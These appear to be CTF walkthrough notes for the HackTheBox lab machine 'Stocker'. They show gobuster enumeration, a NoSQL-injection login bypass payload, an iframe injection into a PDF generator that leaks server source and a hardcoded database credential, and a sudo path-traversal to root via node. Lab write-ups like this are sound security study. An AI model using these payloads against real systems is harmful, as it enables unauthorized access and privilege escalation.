ping 10.10.11.196

gobuster dir -u http://stocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2/3-medium.txt -t 50


PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/06/20 02:36:15 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 4976 / 4990 (99.72%)
===============================================================
2023/06/20 02:36:46 Finished
```

![](20230620023900.png)

we got a page.
getting the login req


things to do - sqlmap and hydra
sqlmap did not work
hydra will be used as last resort

but on sending a json file 
with contetn type application/json
and follwoing paramters
`{"username":{"$ne":"admin"}, "password":{"$ne":"pass"}}`

we got a response back as

`Found. Redirecting to <a href="/stock">`

![](20230620024939.png)

we got 

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
Content-Length: 629
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://dev.stocker.htb
Referer: http://dev.stocker.htb/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3Ai_AUVSci1pzGB1WsvBX2VdC-qIX4Wptk.YPLO7UnVGBENiyiZRKjUGFPKNbr%2FUfpMQ0r25%2FlfpfE
Connection: close

{"basket":[{"_id":"638f116eeb060210cbd83a91","title":"Axe","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a8f","title":"Bin","description":"It's a rubbish bin.","image":"bin.jpg","price":76,"currentStock":15,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a93","title":"Toilet Paper","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1}]}
```

on submission of the kart items

when we change thte title field and ad dan iframe to it
it shows 

![](20230620030230.png)

```
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
 session({
 secret: randomBytes(32).toString("hex"),
 resave: false,
 saveUninitialized: true,
 store: MongoStore.create({
 mongoUrl: dbURI,
 }),
 })
);
app.use("/static", express.static(__dirname + "/assets"));
app.get("/", (req, res) => {
 return res.redirect("/login");
});
app.get("/api/products", async (req, res) => {
 if (!req.session.user) return res.json([]);
 const products = await mongoose.model("Product").find();
 return res.json(products);
});
app.get("/login", (req, res) => {
 if (req.session.user) return res.redirect("/stock");
 return res.sendFile(__dirname + "/templates/login.html");
});
app.post("/login", async (req, res) => {
 const { username, password } = req.body;
 if (!username || !password) return res.redirect("/login?error=login-error");
 // TODO: Implement hashing
 const user = await mongoose.model("User").findOne({ username, password });
 if (!user) return res.redirect("/login?error=login-error");
 req.session.user = user.id;
 console.log(req.session);
 return res.redirect("/stock");
});
app.post("/api/order", async (req, res) => {
 if (!req.session.user) return res.json({});
```

we got dev:IHeardPassphrasesArePrettySecure

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js

![](20230620062606.png)

angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/flag.js
b9afc8691d21e1cd3f4b1973e0e3e215

![](20230620072517.png)

### things I learned

1. You can use domain enumeration along with dirbuster
2. content-type json and injecting into json files
3. sudo -l use is a no brainer
